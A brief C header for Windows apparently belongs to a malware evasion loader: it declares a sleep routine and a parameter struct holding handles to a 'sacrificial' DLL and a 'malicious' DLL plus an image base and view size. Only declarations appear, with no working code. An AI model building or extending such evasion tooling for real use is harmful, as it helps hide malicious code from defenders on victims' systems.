#pragma once
#include "pch.h"

#include <Windows.h>
#include "headers.h"


VOID CALLBACK ResumeThreadCallback(PVOID lpParameter, BOOLEAN TimerOrWaitFired);

typedef struct _sleaping_para
{
    PVOID image_base;
	HANDLE sac_dll_handle;
    HANDLE mal_dll_handle;
    SIZE_T view_size;
    PNT_FUNCTIONS nt;

} sleaping_para_t;

int sleaping(sleaping_para_t* para);